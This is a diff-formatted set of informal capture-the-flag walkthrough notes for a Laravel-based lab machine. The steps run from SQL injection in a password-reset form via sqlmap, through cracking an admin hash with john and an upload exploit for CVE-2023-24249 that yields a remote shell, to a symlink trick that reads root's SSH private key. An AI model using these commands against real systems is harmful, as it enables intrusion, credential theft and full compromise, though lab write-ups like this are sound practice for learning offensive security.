@@ -1,0 +1,38 @@
+Add the host to /etc/hosts . Look around and you will find a reset password form which is seen to react with a 500 to ("test@gmail'") , !note the usage of ' 
+
+
+This is indicative of a SQLi . Register the SQLi proven request and use it inside sql map with a boolean type injection(due to the 500 request err)
+
+
+
+SQLMAP part:
+ ( sqlmap -r reset.req -p email --level 5 --risk 3 --technique=B )   
+(in case you do not want to be asked questions --batch)
+
+--dbs(is used to dump all the db)
+
+table_name --tables : for dumping tables
+
+!!!caution with the threads flag ( it can display corrupted data if the threads are increased for greater speeds)
+
+Once the hashed password is found for the admin user , john can be used to dehash it:
+
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+Once on the admin page there is a dashboard that shows all the dependencies installed on the laravel app.And here is where you find teh following :
+CVE-2023-24249
+
+An arbitrary file upload vulnerability in laravel-admin v1.8.19 allows attackers to execute arbitrary code via a crafted PHP file.
+
+Uploaded a remote shell code and i was in but now i need to escalate my privileges.
+
+On the machine there are 3 users : data ,xander and root.(in data i found the user flag)
+ 
+I looked for what executables the user 'xander' had with root permissions  (sudo -l) . I leveraged the sym link attack vector 
+used in the executable . (touch @id_rsa ; ln -s root/id_rsa id_rsa) . And like that i got the ssh private key for root user .
+
+
+
+
+looking for users on a linux machine : cat /etc/passwd | grep sh$
